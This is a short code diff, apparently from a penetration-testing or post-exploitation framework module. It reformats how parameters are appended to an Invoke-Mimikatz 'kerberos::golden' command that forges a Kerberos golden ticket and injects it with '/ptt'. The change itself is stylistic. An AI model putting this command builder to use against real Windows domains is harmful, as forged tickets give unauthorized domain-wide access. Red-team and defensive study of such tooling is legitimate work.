@@ -60,9 +60,13 @@ class Module:
         script_end = "Invoke-Mimikatz -Command '\"kerberos::golden"
 
         for option, values in params.items():
-            if option.lower() != "agent" and option.lower() != "credid":
-                if values and values != "":
-                    script_end += " /" + str(option) + ":" + str(values)
+            if (
+                option.lower() != "agent"
+                and option.lower() != "credid"
+                and values
+                and values != ""
+            ):
+                script_end += " /" + str(option) + ":" + str(values)
 
         script_end += " /ptt\"'"
 
